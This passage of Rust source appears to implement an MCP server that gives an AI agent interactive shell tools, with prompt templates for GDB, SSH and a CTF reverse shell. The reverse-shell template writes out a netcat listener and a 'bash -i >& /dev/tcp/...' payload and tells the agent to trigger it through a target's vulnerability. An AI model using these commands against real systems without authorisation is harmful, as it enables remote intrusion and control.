    #[schemars(description = "Attacker (local) IP address accessible by the target")]
    pub attacker_ip: String,
    #[schemars(description = "Listening port, defaults to 4444")]
    pub port: Option<u16>,
    #[schemars(description = "Session tag, defaults to listener")]
    pub tag: Option<String>,
}

// ============================================================
// Prompt Implementations (Only one #[prompt_router])
// ============================================================

#[prompt_router]
impl TerminalMcpService {
    #[prompt(name = "shell_usage_guide", description = "Quick reference for core usage principles: when to use exec, when to use interactive sessions")]
    async fn shell_usage_guide(&self) -> Vec<PromptMessage> {
        vec![PromptMessage::new_text(Role::User, guides::QUICK_START)]
    }

    #[prompt(name = "gdb_debug_session", description = "Generate GDB debugging steps for a specified binary")]
    async fn gdb_debug_session(
        &self,
        Parameters(GdbDebugArgs { binary_path, tag }): Parameters<GdbDebugArgs>,
    ) -> Vec<PromptMessage> {
        let tag = tag.unwrap_or_else(|| "gdb1".to_string());
        vec![PromptMessage::new_text(
            Role::User,
            format!(
                "Debug {binary_path} (tag=\"{tag}\"):\n\
                 1. shell_spawn(shell=\"bash\", tag=\"{tag}\")\n\
                 2. shell_send_line(input=\"gdb {binary_path}\", tag=\"{tag}\")\n\
                 3. shell_output(tag=\"{tag}\", idle_ms=1000) confirm the prompt appears\n\
                 4. Confirm with shell_output after every gdb command before proceeding; use \
                    shell_wait_for(tag=\"{tag}\", pattern=\"Breakpoint\", timeout_ms=5000) to wait for \
                    continue/run instead of guessing idle_ms\n\
                 5. Once finished, shell_close(tag=\"{tag}\")\n\
                 See guide://shell/gdb for details"
            ),
        )]
    }

    #[prompt(name = "ssh_connect_session", description = "Generate step-by-step SSH connection operations for a target host")]
    async fn ssh_connect_session(
        &self,
        Parameters(SshConnectArgs { host, user, tag }): Parameters<SshConnectArgs>,
    ) -> Vec<PromptMessage> {
        let tag = tag.unwrap_or_else(|| "ssh1".to_string());
        vec![PromptMessage::new_text(
            Role::User,
            format!(
                "Connect to {user}@{host} (tag=\"{tag}\"):\n\
                 1. shell_spawn(shell=\"bash\", tag=\"{tag}\")\n\
                 2. shell_send_line(input=\"ssh {user}@{host}\", tag=\"{tag}\")\n\
                 3. shell_output(tag=\"{tag}\", idle_ms=1500), respond dynamically based on actual output\n\
                    (yes/password/directly entering remote prompt)\n\
                 4. Execute remote commands only after successful login, use exit and then shell_close(tag=\"{tag}\") before finishing\n\
                 See guide://shell/ssh for details"
            ),
        )]
    }

    #[prompt(name = "reverse_shell_session", description = "Generate reverse shell listening operations for CTF scenarios")]
    async fn reverse_shell_session(
        &self,
        Parameters(ReverseShellArgs { attacker_ip, port, tag }): Parameters<ReverseShellArgs>,
    ) -> Vec<PromptMessage> {
        let port = port.unwrap_or(4444);
        let tag = tag.unwrap_or_else(|| "listener".to_string());
        vec![PromptMessage::new_text(
            Role::User,
            format!(
                "Establish a reverse shell listener on {attacker_ip}:{port} (tag=\"{tag}\"):\n\
                 1. shell_spawn(shell=\"bash\", tag=\"{tag}\")\n\
                 2. shell_send_line(input=\"nc -lvnp {port}\", tag=\"{tag}\")\n\
                 3. shell_output(tag=\"{tag}\", idle_ms=500) confirm listening status\n\
                 4. Trigger via target machine vulnerability, similar to:\n\
                    bash -i >& /dev/tcp/{attacker_ip}/{port} 0>&1\n\
                 5. shell_output(tag=\"{tag}\", idle_ms=2000) confirm the target machine prompt is acquired\n\
                 6. Send subsequent commands via shell_send_line(tag=\"{tag}\"), every step must use \
                    shell_output to confirm the result\n\
                 7. Once finished, shell_close(tag=\"{tag}\")\n\
                 See guide://shell/reverse_shell and guide://shell/security for details"
            ),
        )]
    }
}

// ============================================================
// ServerHandler Implementation
// ============================================================

#[tool_handler]
#[prompt_handler]
impl ServerHandler for TerminalMcpService {
    fn get_info(&self) -> ServerInfo {
        let mut info = ServerInfo::new(
            ServerCapabilities::builder()
                .enable_tools()
                .enable_prompts()
                .enable_resources()
                .build(),
        );
        info.instructions = Some(guides::QUICK_START.to_string());
        info
    }

    async fn list_resources(
        &self,
        _request: Option<PaginatedRequestParams>,
        _context: RequestContext<RoleServer>,
    ) -> std::result::Result<ListResourcesResult, McpError> {
        Ok(ListResourcesResult {
            resources: vec![
                Resource::new("guide://shell/security", "⚠️ Security Guidelines (Must read first)"),
                Resource::new("guide://shell/basics", "shell_* Basic Usage and Lifecycle"),
                Resource::new("guide://shell/pty", "PTY Mode Guide: when to enable pty, and preferring shell_snapshot"),
                Resource::new("guide://shell/gdb", "GDB / pwndbg Debugging Scenario Guide"),
                Resource::new("guide://shell/ssh", "SSH Remote Connection Scenario Guide"),
                Resource::new("guide://shell/sudo", "sudo Password / Confirmation Scenario Guide"),
                Resource::new("guide://shell/reverse_shell", "CTF Reverse Shell Scenario Guide"),
            ],
            next_cursor: None,
            meta: None,
        })
    }

    async fn read_resource(
        &self,
        request: ReadResourceRequestParams,
        _context: RequestContext<RoleServer>,
    ) -> std::result::Result<ReadResourceResult, McpError> {
        let text = match request.uri.as_str() {
            "guide://shell/security" => guides::SECURITY,
            "guide://shell/basics" => guides::BASICS,
            "guide://shell/pty" => guides::PTY,
            "guide://shell/gdb" => guides::GDB,
            "guide://shell/ssh" => guides::SSH,
            "guide://shell/sudo" => guides::SUDO,
            "guide://shell/reverse_shell" => guides::REVERSE_SHELL,
            _ => {
                return Err(McpError::resource_not_found(
                    "resource_not_found",
                    Some(serde_json::json!({ "uri": request.uri })),
                ));
            }
        };
        Ok(ReadResourceResult::new(vec![ResourceContents::text(
            text,
            &request.uri,
        )]))
    }
}

// ============================================================
// Entry Point
// ============================================================

#[tokio::main]
async fn main() -> Result<()> {
    let _audit_guard = audit::init();

    tracing::info!(target: "audit", event = "server_start", "shell mcp service starting");

    let server = TerminalMcpService::new().serve(stdio()).await?;

    server.waiting().await?;

    tracing::info!(target: "audit", event = "server_stop", "shell mcp service stopped");

    Ok(())
}